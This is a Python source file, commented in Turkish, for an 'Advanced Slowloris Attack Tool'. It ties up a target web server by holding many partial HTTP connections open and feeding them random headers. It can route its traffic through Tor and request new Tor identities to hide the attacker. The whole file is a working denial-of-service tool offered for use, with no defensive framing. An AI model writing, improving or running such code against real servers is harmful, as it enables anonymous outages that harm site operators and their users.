import argparse
import threading
import socks
import socket
import random
import time
import requests
from stem.control import Controller

# Tor ayarları
TOR_PROXY = "127.0.0.1:9050"
DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Rastgele User-Agent oluşturucu
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

def start_tor():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal('NEWNYM')
        print("[+] New Tor identity requested.")

def create_socket(target, port, use_tor):
    try:
        s = socks.socksocket()
        if use_tor:
            s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        s.connect((target, port))
        s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: Keep-Alive\r\n\r\n".encode("utf-8"))
        return s
    except Exception as e:
        return None

def slowloris_attack(target, port, sockets_count, use_tor):
    sockets = [create_socket(target, port, use_tor) for _ in range(sockets_count)]
    while True:
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1, 10000)}\r\n".encode("utf-8"))
            except Exception:
                sockets.remove(s)
                sockets.append(create_socket(target, port, use_tor))
        time.sleep(10)

def main():
    parser = argparse.ArgumentParser(description="Advanced Slowloris Attack Tool with Tor & Proxy Support")
    parser.add_argument("target", help="Target host")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-s", "--sockets", type=int, default=150, help="Number of sockets (default: 150)")
    parser.add_argument("--tor", action="store_true", help="Enable Tor proxy (default: OFF)")

    args = parser.parse_args()

    print(f"[+] Target: {args.target}:{args.port}")
    print(f"[+] Using Tor: {args.tor}")
    print(f"[+] Socket Count: {args.sockets}")

    if args.tor:
        start_tor()

    attack_thread = threading.Thread(target=slowloris_attack, args=(args.target, args.port, args.sockets, args.tor))
    attack_thread.start()

if __name__ == "__main__":
    main()